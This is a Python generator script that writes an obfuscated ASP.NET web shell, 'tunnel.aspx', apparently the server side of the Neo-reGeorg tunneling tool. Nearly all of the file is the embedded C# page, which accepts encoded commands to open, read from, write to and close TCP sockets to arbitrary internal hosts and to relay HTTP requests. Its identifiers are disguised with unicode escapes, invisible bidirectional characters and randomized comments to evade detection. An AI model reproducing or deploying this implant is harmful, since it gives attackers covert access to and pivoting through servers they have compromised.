import os
import random
import string

def generate_random_string(length):
    # 定义可能出现的字符集合
    characters = string.ascii_letters + string.digits
    # 随机选择字符集合中的字符，生成指定长度的字符串
    return ''.join(random.choice(characters) for i in range(length))
    
def file_write(filename, data):
    try:
        with open(filename, 'w') as f:
            f.write(data)
            print("[Generate] Successed to write file: %s" % filename)
            print("[Please] Execute 'python3 neoreg.py generate -k password'")
    except:
        print("[Generate] Failed to write file: %s,Please confirm that the templates/ folder exists" % filename)
        exit()
text = r'''
<script runat="server">
    public String \u0053\u0074\u0072\u0054\u0072(string input, string frm, string to) {
        String r = "";
        for(int i=0; i< in\ufeffput.Le\u202angth; i++) {
            int \U00000069\U0000006e\U00000064\U00000065\U00000078\u202b = \U00000066\U00000072\U0000006d\u202a./*RandomCodeReplace*/\u0049\u006e\u0064\u0065\u0078\u004f\u0066(input[i]);;;;;;
            if(index != -1)
                r += t\u202do[index];
            else
                r += in\u202eput[i];
        }
        return r;
    }

    public static Object[] \U00000062\u202c\U0000006c\U00000076\u202c\U0000005f\U00000064\U00000065\U00000063\u202d\U0000006f\U00000064\U00000065(byte[] data) {
        Object[] in\ufefffo = new /*RandomCodeReplace*/Object[40];
/*RandomCodeReplace*/
        int i\u202a\ufeff = 0;
        int \u0064\u0061\u0074\u0061\u005f\u006c\u0065\u006e = \U00000064\U00000061\U00000074\U00000061.\U0000004c\U00000065\U0000006e\U00000067\U00000074\U00000068;
        int b\u202a\ufeff;
        byte[] len\u202cgth = new /*RandomCodeReplace*/byte[4];
/*RandomCodeReplace*/
        Mem\u202doryStr\u202deam dataI\u202dnput = new /*RandomCodeReplace*/\u004d\u202d\u0065\u006d\u202d\u006f\u0072\u202d\u0079\u0053\u0074\u0072\u0065\u0061\u006d(data);

        while ( i < \u0064\u0061\u0074\u0061\u005f\u006c\u0065\u006e ) {
            b = \u0064\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074.\U00000052\U00000065\U00000061\U00000064\U00000042\U00000079\U00000074\U00000065();
            da\ufefftaIn\ufeffput.Re\ufeffad(length, 0, length.Length);
            int l = \u0062\u0079\u0074\u0065\u202c\u0073\u0054\u202c\u006f\u0049\u006e\u0074/*RandomCodeReplace*/(length) - BLV_L_OFFSET;
            byte[] \u0076 = new byte[l]/*RandomCodeReplace*/;
            \u0064\u0061\u202e\u0074\u0061\u0049\u202e\u006e\u0070\u0075\u0074.\u0052\u202e\u0065\u202e\u0061\u0064(v, 0, v.Length);
            i += ( 5 + l );
            if ( b > 1 && b <= BLVHEAD_LEN ) {
                \u0069\u006e\u0066\u006f[b] = \u0045\u006e\u0063\u202c\u006f\u0064\u202c\u0069\u006e\u0067.\u0044\u0065\u0066\u202c\u0061\u0075\u006c\u0074.\u0047\u202c\u0065\u0074\u202c\u0053\u0074\u0072\u0069\u006e\u0067(v);
            } else {
                \u0069\u006e\u0066\u006f[b] = \u0076;
            }
        }

        return \U00000069\U0000006e\U00000066\U0000006f;
    }

    public static byte[] \u0062\u202d\u006c\u0076\u202d\u005f\u0065\u006e\u202d\u0063\u006f\u0064\u0065(Object[] \u0069\u006e\u0066\u006f) {
        Random r = new /*RandomCodeReplace*/Ran\u202ddo\u202dm()/*RandomCodeReplace*/;
        \u0069\u006e\u0066\u006f[0]  = \U00000072\U00000061\U0000006e\U00000064\U00000042\U00000079\U00000074\U00000065\U00000073(r, 5, 20);
        \u0069\u006e\u0066\u006f[39] = \U00000072\U00000061\U0000006e\U00000064\U00000042\U00000079\U00000074\U00000065\U00000073(r, 5, 20);
        \u004d\u0065\u202a\u006d\u006f\u202a\u0072\u0079\u202a\u0053\u0074\u202a\u0072\u0065\u0061\u006d buf = new \u004d\u0065\u202a\u006d\u006f\u202a\u0072\u0079\u202a\u0053\u0074\u202a\u0072\u0065\u0061\u006d();
        for (int b = 0; b < \u0069\u006e\u0066\u006f.Length; b++) {
            if ( \u0069\u006e\u0066\u006f[b] != null ) {
                Object o = \u0069\u006e\u0066\u006f[b];
                byte[] v;
                if ( o is String ){
                    v = \u0045\u006e\u202d\u0063\u202b\u006f\u0064\u0069\u006e\u0067/*RandomCodeReplace*/.\u0044\u0065\u202b\u0066\u0061\u202b\u0075\u202d\u006c\u202b\u0074/*RandomCodeReplace*/.\u0047\u0065\u0074\u202d\u0042\u0079\u0074\u0065\u202b\u0073( (String) o );
                } else {
                    v = (byte[]) o;
                }
                bu\u202bf.Wr\u202biteBy\u202bte((byte) b);
                try {
                    /*RandomCodeReplace*/
                    byte[] l = in\u202btTo\u202bBy\u202btes(v.Length + BLV_L_OFFSET);
                    bu\u202bf.W\u202brite(l, 0, l.Length);
                    b\u202buf.Wri\u202bte(v, 0, v.Length);
                }catch(Exception e) {
                }
            }
        }
        return b\u202buf.\u0054\u202d\u006f\u0041\u202d\u0072\u0072\u202d\u0061\u0079();
    }

    public static byte[] \U00000072\U00000061\U0000006e\U00000064\U00000042\U00000079\U00000074\U00000065\U00000073(Random r, int min, int max) {
        int len = r./*RandomCodeReplace*/Next(min, max);
        byte[] \U00000072\U00000061\U0000006e\U00000064\U00000042\U00000079\U00000074\U00000065\U00000073 = new byte[len];
        r./*RandomCodeReplace*/NextBytes(\U00000072\U00000061\U0000006e\U00000064\U00000042\U00000079\U00000074\U00000065\U00000073);
        return \U00000072\U00000061\U0000006e\U00000064\U00000042\U00000079\U00000074\U00000065\U00000073;
    }

    public static int \u0062\u202a\u0079\u202a\u0074\u0065\u0073\u202a\u0054\u006f\u0049\u202a\u006e\u0074(byte[] bytes) {
        int i;
        i =   (  bytes[3] & /*RandomCodeReplace*/0xff )/*RandomCodeReplace*/
            | (( bytes[2] & /*RandomCodeReplace*/0xff/*RandomCodeReplace*/ ) << 8 )
            | (( bytes[1] & /*RandomCodeReplace*/0xff/*RandomCodeReplace*/ ) << 16)
            | (( bytes[0] & /*RandomCodeReplace*/0xff/*RandomCodeReplace*/ ) << 24);
        return i;
    }

    public static byte[] \u0069\u006e\u0074\u202c\u0054\u006f\u0042\u202c\u0079\u0074\u202c\u0065\u0073(int value) {
        byte[] src = new byte[4];
        src[3] = (byte) (value & /*RandomCodeReplace*/0xFF/*RandomCodeReplace*/);
        src[2] = (byte) ((value >> 8) & /*RandomCodeReplace*/0xFF/*RandomCodeReplace*/);
        src[1] = (byte) ((value >> 16) & /*RandomCodeReplace*/0xFF/*RandomCodeReplace*/);
        src[0] = (byte) ((value >> 24) & /*RandomCodeReplace*/0xFF/*RandomCodeReplace*/);
        return src;
    }
</script>
<%
    int D\u202bAT\u202bA          = 1;
    int C\u202cM\u202cD           = 2;
    int M\u202aA\u202aRK          = 3;
    int S\ufeffTA\ufeffTUS        = 4;
    int \u0045\u0052\u0052\u004f\u0052         = 5;
    int I\u202cP\u202c            = 6;
    int P\u202cOR\u202cT          = 7;
    int \u0052\u0045\u0044\u202c\u0049\u0052\u0045\u202c\u0043\u0054\u0055\u0052\u004c   = 8;
    int FORCE\u202cRED\u202cIR\u202cECT = 9;
    
    String \U00000047\U00000065\U0000006f\U00000072\U00000067\U00000048\U00000065\U0000006c\U0000006c\U0000006f = /*RandomCodeReplace*/"NEO, 'All OK'"/*RandomCodeReplace*/;

    Object[] \u0069\u006e\u0066\u006f  = new /*RandomCodeReplace*/Object[40];
    Object[] r\u0069\u006e\u0066\u006f = new /*RandomCodeReplace*/Object[40];

    String e\u202bn = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    String d\u202be\u202d = /*RandomCodeReplace*/"BASE64 CHARSLIST"/*RandomCodeReplace*/;
    
    if (\U00000052\U00000065\U00000071\U00000075\U00000065\U00000073\U00000074./*RandomCodeReplace*/\u0043\u006f\u006e\u0074\u0065\u006e\u0074\u004c\u0065\u006e\u0067\u0074\u0068 != -1) {
        byte[] bu\u202af\u202af = new byte[\U00000052\U00000065\U00000071\U00000075\U00000065\U00000073\U00000074.\u0043\u006f\u006e\u0074\u0065\u006e\u0074\u004c\u0065\u006e\u0067\u0074\u0068];
        \u0052\u0065\u0071\u202c\u0075\u0065\u0073\u202c\u0074./*RandomCodeReplace*/\u0049\u006e\u202c\u0070\u0075\u0074\u202c\u0053\u0074\u0072\u0065\u0061\u202a\u006d.\u0052\u202a\u0065\u0061\u0064\u202a(buff, 0, buff.Length);
        string b\u202a6\u202a4 = StrTr(\u0045\u006e\u202d\u0063\u006f\u202d\u0064\u0069\u202d\u006e\u0067.\u0044\ufeff\u0065\u0066\ufeff\u0061\u0075\u006c\u0074.\u0047\u0065\ufeff\u0074\u0053\u0074\u0072\ufeff\u0069\u006e\u0067\ufeff(buff), de, en);
        byte[] d\u202aa\u202ata = Con\u202cv\u202ce\u202crt.\U00000046\U00000072\U0000006f\U0000006d\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006e\U00000067(b64);
        \u0069\u006e\u0066\u006f = b\u202cl\u202bv_de\u202bco\u202bde(data);
    }

    String \U00000072\U00000055\U00000072\U0000006c = (String) \u0069\u006e\u0066\u006f[REDIRECTURL];        
    if (\U00000072\U00000055\U00000072\U0000006c != null){
        \u0055\u0072\u0069 u = new /*RandomCodeReplace*/\u0055\u0072\u0069(\U00000072\U00000055\U00000072\U0000006c);
        \u0057\u0065\u0062\u0052\u0065\u0071\u0075\u0065\u0073\u0074 \U00000072\u202d\U00000065\U00000071\u202d\U00000075\U00000065\u202d\U00000073\U00000074 = \u0057\u0065\u202a\u0062\u0052\u0065\u202a\u0071\u0075\u0065\u0073\u0074.\u0043\u202a\u0072\u0065\u202a\u0061\u0074\u0065(u);
        request.\u004d\u0065\u0074\u0068\u006f\u0064 = Request.\u0048\u0074\u0074\u0070\u004d\u0065\u0074\u0068\u006f\u0064;
        foreach (string key in \U00000072\u202d\U00000065\U00000071\u202d\U00000075\U00000065\u202d\U00000073\U00000074.\u0048\u202a\u0065\u202a\u0061\u202a\u0064\u202a\u0065\u0072\u202a\u0073)
        {
            try{
                \U00000072\u202d\U00000065\U00000071\u202d\U00000075\U00000065\u202d\U00000073\U00000074./*RandomCodeReplace*/\u0048\u202a\u0065\u202a\u0061\u202a\u0064\u202a\u0065\u0072\u202a\u0073.Add(key, \U00000072\u202d\U00000065\U00000071\u202d\U00000075\U00000065\u202d\U00000073\U00000074.\u0048\u202a\u0065\u202a\u0061\u202a\u0064\u202a\u0065\u0072\u202a\u0073.Get(key));
            } catch (Exception e){}
        }

        try{
            St\u202area\u202am b\u202aody = request./*RandomCodeReplace*/\u0047\u0065\u0074\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u0053\u0074\u0072\u0065\u0061\u006d();
            \u0069\u006e\u0066\u006f[REDIRECTURL] = null;
            byte[] data = \u0045\u006e\u202d\u0063\u202b\u006f\u0064\u0069\u006e\u0067/*RandomCodeReplace*/.\u0044\u0065\u202b\u0066\u0061\u202b\u0075\u202d\u006c\u202b\u0074/*RandomCodeReplace*/.\u0047\u0065\u0074\u202d\u0042\u0079\u0074\u0065\u202b\u0073(StrTr(Convert.ToBase64String(blv_encode(\u0069\u006e\u0066\u006f)), en, de));
            \U00000062\u202e\U0000006f\U00000064\u202e\U00000079./*RandomCodeReplace*/Write(data, 0, data.Length);
            \U00000062\u202e\U0000006f\U00000064\u202e\U00000079./*RandomCodeReplace*/Close();
        } catch (Exception e){}

        Http\u202dWebR\u202despo\u202dnse res\u202apon\u202ase = (HttpWebResponse)request./*RandomCodeReplace*/\u0047\u0065\u0074\u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065();
        WebH\u202ceaderC\u202colle\u202cction webH\u202cead\u202cer = r\u202cespon\u202cse./*RandomCodeReplace*/Hea\u202cde\u202crs;
        for (int i=0;i < \u0077\u202d\u0065\u0062\u202a\u0048\u0065\u0061\u202a\u0064\u0065\u202a\u0072.Count; i++)
        {
            string r\u202ake\u202ay = \u0077\u202d\u0065\u0062\u202a\u0048\u0065\u0061\u202a\u0064\u0065\u202a\u0072.GetKey(i);
            if (r\u202ake\u202ay != "Content-Length" && r\u202ake\u202ay != /*RandomCodeReplace*/"Transfer-Encoding")
                R\u202bes\u202bpo\u202bnse\u202b.\u0041\u202c\u0064\u202c\u0064\u0048\u202c\u0065\u0061\u202c\u0064\u0065\u0072(r\u202ake\u202ay, \u0077\u202d\u0065\u0062\u202a\u0048\u0065\u0061\u202a\u0064\u0065\u202a\u0072[i]);
        }

        St\u202cream\u202cReader \u0072\u0065\u0070\u0042\u006f\u0064\u0079 = new /*RandomCodeReplace*/St\u202cream\u202cReader(response.\u0047\u0065\u0074\u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065Stream(), \u0045\u006e\u0063\u006f\u0064\u0069\u006e\u0067.\u0047\u0065\u0074\u0045\u006e\u0063\u006f\u0064\u0069\u006e\u0067("UTF-8"));
        string r\u202cbo\u202cdy = \u0072\u0065\u0070\u0042\u006f\u0064\u0079.Re\u202cad\u202cToEnd();
        R\u202bes\u202bpo\u202bnse\u202b./*RandomCodeReplace*/\u0041\u202c\u0064\u202c\u0064\u0048\u202c\u0065\u0061\u202c\u0064\u0065\u0072("Content-Length", r\U00000062\u202e\U0000006f\U00000064\u202e\U00000079.Length.ToString());
        R\u202bes\u202bpo\u202bnse\u202b./*RandomCodeReplace*/Write(r\U00000062\u202e\U0000006f\U00000064\u202e\U00000079);
        return;
    }

    R\u202bes\u202bpo\u202bnse\u202b.\u0053\u0074\u0061\u0074\u0075\u0073\u0043\u006f\u0064\u0065 = HTTPCODE;
    String c\u202bm\u202dd = (String) \u0069\u006e\u0066\u006f[CM\u202cD];
    if (c\u202bm\u202dd != null) {
        String mark = (String) \u0069\u006e\u0066\u006f[MA\u202cRK];
        if (c\u202bm\u202dd == "CONNECT") {
            try {
                Str\u202cing tar\u202cget = (String) \u0069\u006e\u0066\u006f[I\u202cP];
                int po\u202crt = int.Pa\u202crs\u202ce((String) \u0069\u006e\u0066\u006f[PO\u202cRT]);
                IP\u202bAd\u202bd\u202bre\u202bss i\u202bp;
                try {
                    /*RandomCodeReplace*/
                    i\u202bp = IP\u202bAd\u202bd\u202bre\u202bss.Pa\u202crs\u202ce(ta\u202crg\u202cet);
                } catch (Exception ex) {
                    I\u202dPH\u202dos\u202dtEntr\u202dy ho\u202dst = D\u202bn\u202bs.\u0047\u0065\u0074\u0048\u006f\u0073\u0074\u0042\u0079\u004e\u0061\u006d\u0065(tar\u202cget);
                    i\u202bp = ho\u202dst./*RandomCodeReplace*/\u0041\u0064\u0064\u0072\u0065\u0073\u0073\u004c\u0069\u0073\u0074[0];
                }
                Sys\u202dtem.N\u202det.IPEn\u202ddPo\u202dint re\u202dmo\u202dteEP = new \u0049\u202b\u0050\u202b\u0045\u202b\u006e\u0064\u202b\u0050\u202b\u006f\u0069\u006e\u0074(i\u202cp, po\u202crt);
                S\u202cock\u202cet se\u202cn\u202cder = new So\u202cc\u202cket(Add\u202cres\u202csFam\u202cily.Int\u202cerNe\u202ctwo\u202crk, SocketType.St\u202cre\u202cam, Pr\u202cot\u202cocolTy\u202cpe.Tc\u202cp);
                IAsy\u202dncR\u202des\u202dult r\u202desu\u202dlt = sen\u202dder.Begi\u202dnCon\u202dne\u202dct(re\u202dmot\u202deEP,null,null);
                bool suc\u202dces\u202ds = resu\u202dlt.A\u202dsy\u202dnc\u202dWaitHan\u202dd\u202dle.WaitO\u202dn\u202de( 2000, true );

                if ( \u0073\ufeff\u0065\ufeff\u006e\ufeff\u0064\u0065\u0072.Connected ) {
                    \u0073\ufeff\u0065\ufeff\u006e\ufeff\u0064\u0065\u0072.Blocking = /*RandomCodeReplace*/false;
                    Application.Add(mark, \u0073\ufeff\u0065\ufeff\u006e\ufeff\u0064\u0065\u0072);
                    r\u0069\u006e\u0066\u006f[STATUS] = "OK";
                } else {
                    \u0073\ufeff\u0065\ufeff\u006e\ufeff\u0064\u0065\u0072.Close();
                    r\u0069\u006e\u0066\u006f[STATUS] = "FAIL";
                    if ( success ) {
                        r\u0069\u006e\u0066\u006f[ERROR] = "P.o.r.t c.l.o.s.e";
                    } else {
                        r\u0069\u006e\u0066\u006f[ERROR] = "P.o.r.t f.i.l.t.e.r.e.d";
                    }
                }
            } catch (Exception ex) {
                r\u0069\u006e\u0066\u006f[STATUS] = "FAIL";
                r\u0069\u006e\u0066\u006f[ERROR] = ex./*RandomCodeReplace*/\U0000004d\U00000065\U00000073\U00000073\U00000061\U00000067\U00000065;
            }
        } else if (c\u202bm\u202dd == "DISCONNECT") {
            try {
                Soc\u202cket s = (Soc\u202cket)Appl\u202cicat\u202cion[mark];/*RandomCodeReplace*/
                s.Close();
            } catch (Exception ex){/*RandomCodeReplace*/
            }
            Application.Remove(mark);
        } else if (c\u202bm\u202dd == "FORWARD") {
            Socket s = (Socket)Application[mark];
            try {
                s.Send((byte[]) \u0069\u006e\u0066\u006f[DATA]);
                r\u0069\u006e\u0066\u006f[STATUS] = "OK";
            } catch (Exception ex) {
                r\u0069\u006e\u0066\u006f[STATUS] = "FAIL";
                r\u0069\u006e\u0066\u006f[ERROR] = ex.\U0000004d\U00000065\U00000073\U00000073\U00000061\U00000067\U00000065;
            }
        } else if (c\u202bm\u202dd == "READ") {
            try {
                So\u202eck\u202eet s = (Sock\u202eet)App\u202elicat\u202eion[m\u202ear\u202ek];
                int max\u202eRea\u202ed = /*RandomCodeReplace*/MAXREADSIZE;
                int re\u202eadb\u202euflen = /*RandomCodeReplace*/READBUF;
                int r\u202eead\u202eLen = 0;
                byte[] re\u202eadB\u202euff = new /*RandomCodeReplace*/byte[re\u202eadbuf\u202elen];
                \u004d\u0065\u202a\u006d\u006f\u202a\u0072\u0079\u202a\u0053\u0074\u202a\u0072\u0065\u0061\u006d readData = new \u004d\u0065\u202a\u006d\u006f\u202a\u0072\u0079\u202a\u0053\u0074\u202a\u0072\u0065\u0061\u006d();
                try {
                    int c = s.\u0052\u0065\u0063\u0065\u0069\u0076\u0065(rea\ufeffdBu\ufeffff);
                    while (c > 0) {
                        byte[] ne\ufeffwBu\ufeffff = new /*RandomCodeReplace*/byte[c];
                        System.Bu\ufeffffer./*RandomCodeReplace*/Blo\ufeffck\ufeffCop\ufeffy(rea\ufeffdBu\ufeffff, 0, ne\ufeffwB\ufeffuff, 0, c);
                        string b6\ufeff4 = Conve\ufeffrt.ToB\ufeffase6\ufeff4Stri\ufeffng(newBuff);
                        re\ufeffadD\ufeffata.Wr\ufeffite(n\u202aewBu\u202aff, 0, c);
                        readL\ufeffen += c;
                        if (c < rea\u202adbuf\u202alen || re\u202aad\u202aLen >= m\u202aax\u202aRe\u202aad)
                            break;
                        c = s./*RandomCodeReplace*/\u0052\u0065\u0063\u0065\u0069\u0076\u0065(re\u202aad\u202aBuf\u202af);
                    }
                    r\u0069\u006e\u0066\u006f[DATA] = rea\ufeffdDa\ufeffta.\u0054\u202d\u006f\u0041\u202d\u0072\u0072\u202d\u0061\u0079();
                    r\u0069\u006e\u0066\u006f[STATUS] = /*RandomCodeReplace*/"OK";
                } catch (SocketException ex) {
                    /*RandomCodeReplace*/
                    r\u0069\u006e\u0066\u006f[STATUS] = "OK";
                }
            } catch (Exc\ufeffep\ufefftion ex) {
                r\u0069\u006e\u0066\u006f[STA\ufeffTUS] = "FAIL";
                r\u0069\u006e\u0066\u006f[ERR\ufeffOR] = ex./*RandomCodeReplace*/\U0000004d\U00000065\U00000073\U00000073\U00000061\U00000067\U00000065;
            }
        }
        R\u202bes\u202bpo\u202bnse\u202b.Write(S\ufefftr\ufeffTr(Con\ufeffve\ufeffrt.To\ufeffBase6\ufeff4Str\ufeffing(bl\ufeffv_en\ufeffcod\ufeffe(r\u0069\u006e\u0066\u006f)), e\ufeffn, d\ufeffe));
    } else {
        R\u202bes\u202bpo\u202bnse\u202b./*RandomCodeReplace*/Write(\u0045\u006e\u202d\u0063\u006f\u202d\u0064\u0069\u202d\u006e\u0067.\u0044\ufeff\u0065\u0066\ufeff\u0061\u0075\u006c\u0074.\u0047\u0065\ufeff\u0074\u0053\u0074\u0072\ufeff\u0069\u006e\u0067\ufeff(Convert.\U00000046\U00000072\U0000006f\U0000006d\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006e\U00000067(StrTr(\U00000047\U00000065\U0000006f\U00000072\U00000067\U00000048\U00000065\U0000006c\U0000006c\U0000006f, d\ufeffe, e\ufeffn))));
    }
%>
<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="Sys\ufeffte\u202dm.I\ufeffO" %>
<%@ Import Namespace="Syst\ufeffe\u202dm.N\ufeffet" %>
<%@ Import Namespace="Sys\ufeffte\u202dm.Te\ufeffxt" %>
<%@ Import Namespace="Syst\ufeffe\u202dm.N\ufeffet.So\u202dck\u202dets" %>
<%@ Import Namespace="Syste\ufeffm\u202d.Coll\ufeffectio\u202dns" %>
'''
text2=''''''
for line in text.splitlines():
    if "RandomCodeReplace" in line:
        # 生成一个长度为 10 的随机字符串
        random_string = generate_random_string(30)
        line = line.replace(r"RandomCodeReplace", random_string)
        text2 = text2+line+'\n'
    else:
        text2 = text2+line+'\n'

filepath = os.getcwd()
outfile = filepath+'/templates/tunnel.aspx'
file_write(outfile, text2)
